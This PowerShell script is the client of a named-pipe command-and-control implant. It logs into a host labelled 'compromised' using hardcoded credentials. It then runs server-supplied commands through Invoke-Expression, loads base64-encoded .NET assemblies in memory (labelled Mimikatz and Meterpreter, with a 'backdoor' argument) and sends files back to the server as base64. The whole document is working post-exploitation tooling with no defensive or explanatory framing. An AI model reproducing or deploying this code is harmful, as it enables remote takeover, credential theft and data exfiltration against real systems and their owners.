function ReadCommand ([System.IO.StreamReader]$StreamReader){ #Read Command from Server
    $msg = $StreamReader.ReadLine()
    if($msg -eq "action=1"){
        Write-Host "---------- Receiving message ----------"
        $status = "1"
        return $status
    }
    elseif($msg -eq "action=2"){
        Write-Host "---------- Receiving payload ----------"
        $status = "2"
        return $status
    }
    elseif($msg -eq "action=3"){
        Write-Host "---------- Receiving command ----------"
        $status = "3"
        return $status
    }
    elseif($msg -eq "action=4"){
        Write-Host "----------- File Extraction -----------"
        $status = "4"
        return $status
    }
    elseif($msg -eq "action=5"){
        Write-Host "Disconnected."
        $status = "5"
        return $status
    }
}

$pipeName = "YahudPipe"
# Compromised system
$pipeServer = "192.168.101.13"
# Compromised account
$username = "HakkYahud"
$password = "Root*123"
# Authenticate to the server before connecting to the Server pipe
$auth = "net use \\{0} /user:{1} {2}" -f $pipeServer, $username, $password
Invoke-Expression -Command $auth

$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream($pipeServer, $pipeName)
Write-Host "Attempting to connect to the pipe..."

try {
    $pipeClient.Connect(10000);
    Write-Host "Connected."
    $sw = New-Object System.IO.StreamWriter($pipeClient)
    $sr = New-Object System.IO.StreamReader($pipeClient)
    $hostname = Invoke-Expression -Command "hostname"
    $sw.WriteLine($hostname)
    $sw.AutoFlush = $true # Without autoflush, buffer will flush when the pipe is close, autoflush is necessary for interactive session
    $status = "0"
}
catch {
    Write-Host "Failed to connect to the pipe."
    $pipeClient.Dispose()
}

while($pipeClient.IsConnected){
    if($status -eq "0"){
        $status = ReadCommand $sr
    }

    elseif($status -eq "1"){
        $msg = $sr.ReadLine()
        if($msg -eq "stop"){
            Write-Host "Stop receiving message..."
            $status = "0"
        }
        else{
            Write-Host $msg
        }
        
    }

    elseif($status -eq "2"){
        # What script to run
        $script_action = $sr.ReadLine()

        if($script_action -eq "Mimikatz"){
            $assemblyB64 = $sr.ReadLine()
            $assemblyByte = [System.Convert]::FromBase64String($assemblyB64)
            $assembly = [System.Reflection.Assembly]::Load($assemblyByte)
            $assembly.EntryPoint.Invoke($null, $null)
        }
        elseif($script_action -eq "Meterpreter"){
            Write-Host "Opening Meterpreter Session"
            $assemblyB64 = $sr.ReadLine() # Receiving .NET payload
            $assemblyByte = [System.Convert]::FromBase64String($assemblyB64)
            $assembly = [System.Reflection.Assembly]::Load($assemblyByte)
            [String]$param = $sr.ReadLine() # Receiving backdoor from server
            [String[]]$parameter = @(, $param)
            $parameter_invoke = (, $parameter)
            $assembly.EntryPoint.Invoke($null, $parameter_invoke)
        }
        elseif ($script_action -eq "Test PowerShell Assembly"){
            Write-Host "For testing purpose"
            $assemblyPath = $sr.ReadLine()
            $filename = $sr.ReadLine()
            [String]$param = [System.IO.File]::ReadAllText($filename)
            [String[]]$parameter = @(, $param)

            # Read the assembly from disk into a byte array
            [Byte[]]$assemblyByte = [System.IO.File]::ReadAllBytes($assemblyPath)
            # Load the assembly
            $assembly = [System.Reflection.Assembly]::Load($assemblyByte)
            # Find the Entrypoint or "Main" method
            $entryPoint = $assembly.EntryPoint
            # Get Parameters
            $parameter_invoke = (, $parameter )

            # Invoke the method with the specified parameters
            $entryPoint.Invoke($null, $parameter_invoke) # Wrap the inner aray in another array litteral expression
        }

        $status = "0"
    }

    elseif($status -eq "3"){
        $command = $sr.ReadLine()
        if($command -eq "stop"){
            Write-Host "Stop running command"
            $status = "0"
        }
        else{
            Write-Host "Sending output of",$command,"to server..."
            $result = Invoke-Expression -Command $command
            $sw.WriteLine($result.Length) # Sending lenght of the command result to Server
            for($cpt = 0; $cpt -lt $result.Length; $cpt++){
                $sw.WriteLine($result[$cpt])
            }
        }
    }

    elseif($status -eq "4"){
        $filepath = $sr.ReadLine()

        if($filepath -eq "stop"){
            Write-Host "Stop copying file..."
            $status = "0"
        }

        else{
            try{
                Write-Host "Copying file to host"
                $filebytes = [System.IO.File]::ReadAllBytes($filepath)
                $fileB64 = [System.Convert]::ToBase64String($filebytes)
                Write-Host $filebytes
                $sw.WriteLine($fileB64)  
            }
            catch [System.IO.FileNotFoundException]{
                Write-Host "File Not Found...Stop copying"
                $sw.WriteLine("File Not Found...")
            }                    
        }
    }

    elseif($status -eq "5"){
        $sr.Dispose();
        $pipeClient.Dispose();
    }
    
}
